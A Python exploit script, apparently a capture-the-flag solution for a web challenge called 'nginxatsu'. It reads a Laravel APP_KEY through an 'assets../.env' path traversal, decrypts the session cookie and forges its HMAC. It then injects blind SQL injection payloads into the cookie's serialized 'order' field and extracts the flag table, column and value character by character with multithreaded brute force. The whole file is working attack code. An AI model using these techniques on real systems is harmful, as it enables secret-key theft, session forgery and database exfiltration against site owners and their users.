# Coded by d4rkstat1c
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode, b64encode
import requests
import json
import time
import phpserialize
import hmac
import hashlib
from string import printable
from urllib import parse
import re
from threading import Thread
from time import sleep
from sys import exit

BASE_URL = 'http://<nginxatsu_ip>:<port>/'
MAX_THRDS = 15 # If character overlap occurs decrease the MAX_THRDS int

def get_req(session, url):
	try:
		return session.get(url)
	except ConnectionResetError as e:
		exit('Error sending GET request to CTF server')

def get_cookie(cookies, cookie_id):
	for cookie in cookies:
		if cookie_id not in cookie:
			return cookie

def ascii_gen(ascii_hex):
    if ascii_hex:
        return [num for num in range(32, (128))]
    else:
        return printable[:-6]

# Annotation wrapper function to execute __send_payload method as a thread
def threaded(method):
    def wrapper(*args):
        t = Thread(target=method, args=args)
        t.setDaemon(True)
        t.start()
        return t
    return wrapper

class Aes:
	def __init__(self, key):
		self.key = key
		self.iv = None

	def encrypt(self, pt):
		cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
		return cipher.encrypt(pad(pt, 16))

	def decrypt(self, ct):
		cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
		return unpad(cipher.decrypt(ct), 16)

class cookie_bsqli:
	def __init__(self):
		self.url = BASE_URL
		self.session = requests.session()
		self.aes = Aes(self.__get_key())
		self.cookie_dict, self.cookie_id = self.__decode_cookie()
		self.deserialized_data = self.__decrypt_value()
		self.exfil_data = {}
		self.thrds = []

	def __get_key(self):
		get_req(self.session, self.url)
		env_data = get_req(self.session, self.url+'assets../.env').text
		key_pattern = 'APP_KEY=base64:'
		app_key_start = env_data.find(key_pattern)+len(key_pattern)
		key_str = env_data[app_key_start:app_key_start+44]
		return b64decode(key_str)

	def __decode_cookie(self):
		# First extract target cookie ID/name and corresponding values and parse the json data of the target cookie
		cookies = self.session.cookies.items()
		cookie_id, encoded_data = get_cookie(cookies, 'nginxatsu_session')
		cookie_json = b64decode(parse.unquote(encoded_data))
		cookie_dict = json.loads(cookie_json)
		return cookie_dict, cookie_id

	def __decode_value(self):
		encrypted_val = b64decode(self.cookie_dict['value'])
		self.aes.iv = b64decode(self.cookie_dict['iv'])
		return encrypted_val

	def __decrypt_value(self):
		# Decode the target cookie's json "value" and "iv" base64 encoded strings
		encrypted_val = self.__decode_value()

		# Decrypt the encrypted "value" raw bytes and parse the json "value" data into a dictionary
		json_val = self.aes.decrypt(encrypted_val)
		value_data = json.loads(json_val)
		return phpserialize.loads(value_data['data'].encode())

	def __encode_value(self, encrypted_nval):
		b64_encrypted_nval = b64encode(encrypted_nval).decode()

		# Modify the original cookie_dict extracted from the first step to contain the injected value payload and newly generated hmac
		self.cookie_dict['value'] = b64_encrypted_nval
		self.cookie_dict['mac'] = hmac.new(self.aes.key, (self.cookie_dict['iv']+self.cookie_dict['value']).encode(), hashlib.sha256).hexdigest()

		# Convert cookie_dict to json then base64 encode it
		return json.dumps(self.cookie_dict).encode()

	def __encrypt_value(self, payload_fstr, pos, ch):
		# We now have the target cookie data that we can inject with our constructed BLIND-SQLI payload
		payload = payload_fstr.format(pos=pos, ch=ch)
		self.deserialized_data[b'order'] = payload

		# Next we re-serialized the cookie containing the payload and user and json encode it
		serialized_data = phpserialize.dumps(self.deserialized_data)
		new_data = {'data':serialized_data.decode(), 'expires':int(time.time()+60*60)}
		json_nval = json.dumps(new_data).encode()

		# Encrypt the injected data object contained in the target cookie
		encrypted_nval = self.aes.encrypt(json_nval)
		cookie_payload = self.__encode_value(encrypted_nval)
		return b64encode(cookie_payload).decode()

	def __check_status(self, status_code, pos, ch):
		if status_code == 200 and ch:
			if type(ch) == int:
				self.exfil_data[pos] = chr(ch)
			else:
				self.exfil_data[pos] = ch
			print("Char found:", self.exfil_data[pos], "At index:", pos)

	@threaded
	def __send_payload(self, payload_fstr, pos, ch):
		b64_cookie_payload = self.__encrypt_value(payload_fstr, pos, ch)

		# Now set the current session cookie to our injected cookie + nginxatsu_session
		self.session.cookies.set(self.cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
		r = get_req(self.session, self.url+'api/configs/')
		self.__check_status(r.status_code, pos, ch)

	def __sort_data(self):
		data = dict(sorted(self.exfil_data.items())).values()
		self.exfil_data = {}
		return ''.join(list(data))

	def __check_thrds(self):
		for thrd in self.thrds:
			while thrd.is_alive():
				sleep(0.5)

	def inject(self, payload_fstr, brute_sz, ascii_hex=False):
		ascii_chars = ascii_gen(ascii_hex)
		for pos in range(1, brute_sz+1):
			for ch in ascii_chars:
				self.thrds.append(self.__send_payload(payload_fstr, pos, ch))
				while len(self.thrds) == MAX_THRDS:
					sleep(0.005)
					for thrd in self.thrds:
						if not thrd.is_alive():
							self.thrds.remove(thrd)
				if pos in self.exfil_data.keys():
					break
		self.__check_thrds()
		return self.__sort_data()

# target db = 'nginxatsu'
# target table = 'definitely_not_a_flaaag'
# target column = 'flag_xxxxx' row = '<flag>'
def main():
	s = cookie_bsqli()
	table_payload = "id->\"')), (SELECT (CASE WHEN (SELECT SUBSTRING(table_name,{pos},1) FROM information_schema.tables WHERE table_name LIKE '%fl%' LIMIT 1) = '{ch}' THEN 'SUCCESS' ELSE (select exp(~(SELECT * FROM (select user())x))) END)) #"
	flag_table = s.inject(table_payload, 23)
	print('[*] table exfiltrated:', flag_table)

	column_payload = "id->\"')), (SELECT (CASE WHEN (SELECT SUBSTRING(column_name,{pos},1) FROM information_schema.columns WHERE table_name = '"+flag_table+"' AND column_name LIKE '%flag%' LIMIT 1) = '{ch}' THEN 'SUCCESS' ELSE (select exp(~(SELECT * FROM (select user())x))) END)) #"
	flag_column = s.inject(column_payload, 10)
	print('[*] column exfiltrated:', flag_column)

	flag_payload = "id->\"')), (SELECT (CASE WHEN (SELECT ASCII(SUBSTRING("+flag_column+",{pos},1)) FROM nginxatsu."+flag_table+") = {ch} THEN 'SUCCESS' ELSE (select exp(~(SELECT * FROM (select user())x))) END)) #"
	ctf_flag = s.inject(flag_payload, 32, True)
	print('[*] flag exfiltrated:', ctf_flag)

if __name__ == '__main__':
	main()
